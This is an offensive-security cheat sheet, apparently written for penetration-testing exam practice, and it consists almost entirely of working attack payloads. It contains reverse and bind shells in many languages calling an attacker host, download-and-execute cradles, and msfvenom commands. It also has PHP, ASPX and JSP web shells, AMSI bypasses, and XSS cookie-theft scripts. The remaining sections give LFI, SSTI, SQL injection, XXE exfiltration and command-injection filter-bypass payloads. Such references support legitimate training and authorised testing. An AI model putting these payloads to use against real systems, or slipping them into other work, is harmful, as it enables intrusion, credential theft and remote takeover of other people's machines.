# Payloads Reference

> Replace `LHOST` and `LPORT` throughout. Start your listener before executing any payload.

---

## Listeners

```bash
# Netcat
nc -lvnp LPORT

# Netcat with rlwrap (arrow keys work)
rlwrap nc -lvnp LPORT

# Metasploit multi/handler
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp   # or windows/x64/shell_reverse_tcp etc.
set LHOST LHOST
set LPORT LPORT
run
```

---

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Via /bin/sh (when bash is not available)
sh -i >& /dev/tcp/LHOST/LPORT 0>&1

# URL encoded (for injection into HTTP params)
bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261
```

### Python
```bash
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# With proc_open
php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Perl
```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Ruby
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");loop{c.gets.chomp!;(exit! if $_=="exit");IO.popen($_,"r"){|io|c.print io.read}}'
```

### Netcat
```bash
# With -e (traditional netcat)
nc LHOST LPORT -e /bin/bash

# Without -e (OpenBSD netcat)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
```

### PowerShell (Windows)
```powershell
# One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Download and execute from URL (IEX cradle)
powershell -nop -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"

# Encoded command (bypass execution policy)
# Generate on Linux: echo "IEX(...)" | iconv -t UTF-16LE | base64 -w0
powershell -enc BASE64_ENCODED_COMMAND
```

### Windows CMD
```cmd
certutil -urlcache -f http://LHOST/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
```

---

## Bind Shells
> Use when the target cannot reach you (outbound filtered). You connect to the target.

```bash
# Linux — with -e
nc -lvnp LPORT -e /bin/bash

# Linux — without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp LPORT > /tmp/f

# Connect to a bind shell
nc TARGET_IP LPORT

# msfvenom Linux bind
msfvenom -p linux/x64/shell_bind_tcp LPORT=LPORT -f elf -o bind.elf

# msfvenom Windows bind
msfvenom -p windows/x64/shell_bind_tcp LPORT=LPORT -f exe -o bind.exe
```

---

## Web Shells

### PHP — minimal (GET)
```php
<?php system($_GET['cmd']); ?>
```

### PHP — POST parameter
```php
<?php system($_POST['cmd']); ?>
```

### PHP — with output formatting
```php
<?php $c=$_GET['cmd'];$o=shell_exec($c." 2>&1");echo "<pre>$o</pre>"; ?>
```

### ASPX — Windows / IIS
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
</script>
```

### JSP — Java / Tomcat
```jsp
<% Runtime rt = Runtime.getRuntime(); String[] commands = {"sh","-c",request.getParameter("cmd")}; Process proc = rt.exec(commands); java.io.InputStream is = proc.getInputStream(); java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A"); out.println(s.hasNext() ? s.next() : ""); %>
```

### .htaccess — Apache extension filter bypass
```apache
# Upload this as .htaccess to make Apache treat .jpg files as PHP
AddType application/x-httpd-php .jpg
```
> Then upload your PHP webshell with a `.jpg` extension — it will execute as PHP.

---

## msfvenom Payloads

> **CPTS exam note:** msfvenom generation and multi/handler do **not** count toward your one Metasploit exploit use. Only exploit modules count.

### Linux
```bash
# Stageless ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf

# Staged ELF (requires multi/handler)
msfvenom -p linux/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell_staged.elf

# Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o meter.elf
```

### Windows
```bash
# Stageless EXE (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe

# Stageless EXE (32-bit — use when target is x86 or architecture unknown)
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell32.exe

# Staged EXE (requires multi/handler)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell_staged.exe

# Meterpreter EXE (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o meter.exe

# Meterpreter EXE (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o meter32.exe

# DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o shell.dll

# PowerShell script
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f psh -o shell.ps1

# ASP / ASPX for web upload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f asp  -o shell.asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f aspx -o shell.aspx
```

### Web
```bash
# PHP
msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw -o shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war
```

---

## Shell Upgrade & Stabilization

### Linux — Python PTY (most reliable)
```bash
# Step 1 — spawn a PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
python  -c 'import pty;pty.spawn("/bin/bash")'   # fallback if python3 not available

# Step 2 — background the shell
Ctrl+Z

# Step 3 — fix your local terminal
stty raw -echo; fg

# Step 4 — set terminal variables inside the shell
export TERM=xterm-256color
stty rows 50 columns 200                          # match your actual terminal size
```

### Linux — Other PTY methods
```bash
script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
echo os.system('/bin/bash')                       # from inside a python interpreter
```

### Linux — socat (fully interactive PTY in one step)
```bash
# On your attack box — listener
socat file:`tty`,raw,echo=0 tcp-listen:LPORT

# On the target — connect back
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```
> socat gives a fully interactive shell immediately with no extra steps; use when socat is available on target.

### Windows — Upgrade to PowerShell
```cmd
powershell -ep bypass
```

### Windows — Evil-WinRM (if credentials available)
```bash
evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD'
evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH
```

### Windows — AMSI Bypass
> Paste into a PowerShell session on the target before running any offensive PowerShell tools.

```powershell
# Method 1 — memory patching (most reliable)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}

# Method 2 — force error (simpler, sometimes caught)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static');$c=$b.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c,0x41414141)
```
> Run one of these before executing PowerView, Rubeus, SharpHound, or any other tool that triggers AMSI.

---

## XSS Payloads

### Basic detection probes
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Filter bypass variants
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- No closing tag -->
<script>alert(1)//

<!-- Event handlers (when script tags are blocked) -->
<img src=x onerror="alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- SVG (bypasses many filters) -->
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>

<!-- HTML entity encoded -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Template literal (for JS injection context) -->
${alert(1)}
```

### Cookie theft (stored XSS impact)
```html
<script>fetch('http://LHOST/steal?c='+document.cookie)</script>
<script>new Image().src='http://LHOST/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://LHOST/steal?c='+document.cookie)">
```

---

## LFI / Path Traversal Payloads

### Basic traversal strings
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%2fpasswd
```

### High-value Linux files to read
```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.ssh/id_rsa
/home/USER/.ssh/id_rsa
/home/USER/.bash_history
/var/www/html/config.php
/proc/self/environ
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
```

### High-value Windows files to read
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\Users\Administrator\Desktop\root.txt
```

### PHP wrappers
```
# Source code disclosure (base64 — decode the output)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php

# Direct code execution (data://)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# (above decodes to: <?php system($_GET['cmd']); ?>)

# Code execution via php://input (send PHP in POST body)
php://input
# POST body: <?php system('id'); ?>
```

### Log poisoning — User-Agent injection
```
# Step 1: inject PHP into Apache/Nginx access log via User-Agent
# Set User-Agent to: <?php system($_GET['cmd']); ?>

# Step 2: include the log file via LFI
/var/log/apache2/access.log?cmd=id
/var/log/nginx/access.log?cmd=id
```

### pearcmd.php (write webshell via PEAR)
```
# Include pearcmd.php with crafted query string to write a shell
/usr/local/lib/php/pearcmd.php?+config-create+/&/<?php system($_GET['cmd']);?>+/tmp/shell.php
# Then include /tmp/shell.php via the LFI parameter
```

---

## SSTI Payloads

### Detection — identify injection and engine
```
{{7*7}}           → 49 = Jinja2 / Twig
${7*7}            → 49 = Freemarker / Mako
<%= 7*7 %>        → 49 = ERB (Ruby)
#{7*7}            → 49 = Ruby interpolation
*{7*7}            → 49 = Spring (Java)
{{7*'7'}}         → 7777777 = Jinja2
                  → 49      = Twig
```

### Jinja2 (Python) — RCE
```python
# Basic OS command execution
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Class traversal RCE (when config is blocked)
{{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Reverse shell via Jinja2
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/LHOST/LPORT 0>&1').read()}}
```

### Twig (PHP) — RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'")}}
```

### Freemarker (Java) — RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB (Ruby) — RCE
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read() %>
```

---

## SQL Injection Payloads

### Authentication bypass
```sql
-- Basic OR bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
' OR 1=1#
admin'--
admin' #
' OR 'x'='x

-- With username field (login as admin)
admin' --
admin'/*
' OR 1=1 LIMIT 1--

-- Quote variations
" OR "1"="1
" OR 1=1--
```

### UNION — column count detection
```sql
-- Increment ORDER BY until error to find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here means 2 columns

-- NULL-based UNION (more reliable than integers)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### UNION — find string columns and extract data
```sql
-- Replace NULLs one at a time with a string to find which columns display
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Extract database name, version, user
' UNION SELECT database(),NULL,NULL--        -- MySQL
' UNION SELECT @@version,NULL,NULL--         -- MySQL/MSSQL
' UNION SELECT version(),NULL,NULL--         -- PostgreSQL
' UNION SELECT user(),NULL,NULL--            -- MySQL current user

-- Extract tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Extract columns from a table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password FROM users--
```

### Blind — boolean-based
```sql
' AND 1=1--    ← true condition, normal response
' AND 1=2--    ← false condition, different response
' AND SUBSTRING(username,1,1)='a'--
```

### Blind — time-based confirmation
```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--
```

### File read / write (MySQL)
```sql
-- Read a file (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Write a webshell (requires FILE privilege and writable web root)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### MSSQL — command execution
```sql
-- Enable xp_cmdshell (requires sysadmin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- Execute OS command
'; EXEC xp_cmdshell 'whoami';--
```

### NoSQL injection (MongoDB)
```
# In JSON body — bypass authentication
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# In URL params
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=.*&password[$regex]=.*
```

---

## XXE Payloads

### Basic file read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- Windows -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>

<!-- Internal service probe -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">]>
<root><data>&xxe;</data></root>
```

### Blind OOB — exfiltrate via HTTP callback
```xml
<!-- Step 1: host this DTD on your attack box as evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?data=%file;'>">
%eval;
%exfil;

<!-- Step 2: reference it in the XML payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://LHOST/evil.dtd">%xxe;]>
<root><data>test</data></root>
```

### PHP source disclosure via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root><data>&xxe;</data></root>
```

### XXE via SVG file upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
<text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

---

## Command Injection Filter Bypasses

### Space substitutes (when spaces are filtered)
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd';$X
```

### Slash substitutes (when / is filtered)
```bash
cat${HOME:0:1}etc${HOME:0:1}passwd       # uses / from $HOME
echo${IFS}"Y2F0IC9ldGMvcGFzc3dk"|base64${IFS}-d|bash
```

### Semicolons, pipes, and ampersands (alternatives when one is blocked)
```bash
cmd1;cmd2        # sequential
cmd1|cmd2        # pipe
cmd1&&cmd2       # AND
cmd1||cmd2       # OR
cmd1`cmd2`       # backtick subshell
cmd1$(cmd2)      # subshell
```

### Keyword/character filter bypass
```bash
# Concatenation to break keyword signatures
c'a't /etc/passwd
c"a"t /etc/passwd
/bin/c?t /etc/passwd        # ? wildcard
/bin/ca* /etc/passwd        # * wildcard

# Hex encoding
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Brace expansion (no spaces needed)
{ls,-la,/etc}
```

### Newline injection (when only ;, &&, || are filtered)
```
cmd1%0acmd2
cmd1%0d%0acmd2
```

### Out-of-band confirmation (when output is blind)
```bash
# DNS callback — confirm execution without seeing output
nslookup `whoami`.LHOST
curl http://LHOST/`whoami`
wget http://LHOST/$(id|base64)
ping -c1 LHOST

# Time-based confirmation
sleep 5
ping -c 5 127.0.0.1
```
